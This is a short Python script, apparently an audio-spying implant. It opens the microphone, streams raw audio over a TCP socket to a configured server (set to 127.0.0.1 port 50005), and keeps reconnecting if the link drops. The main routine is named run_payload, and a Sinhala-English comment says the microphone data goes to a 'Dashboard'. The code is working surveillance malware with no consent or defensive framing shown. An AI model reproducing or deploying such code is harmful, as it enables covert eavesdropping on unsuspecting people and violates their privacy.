import socket
import sounddevice as sd
import time

SERVER_IP = '127.0.0.1' 
PORT = 50005  

def callback(indata, frames, time, status):
    """Me function eka microphone eken ena data Dashboard ekata yawai"""
    if status:
        print(status)
    try:
        global client_socket
        client_socket.sendall(indata.tobytes())
    except:
        pass

def run_payload():
    global client_socket
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(10)
            client_socket.connect((SERVER_IP, PORT))
            
         
            with sd.InputStream(samplerate=44100, channels=1, dtype='int16', callback=callback):
                while True:
                    time.sleep(1) 
                    
        except Exception as e:
            print(f"Connection lost, retrying... {e}")
            time.sleep(5)

if __name__ == "__main__":
    run_payload()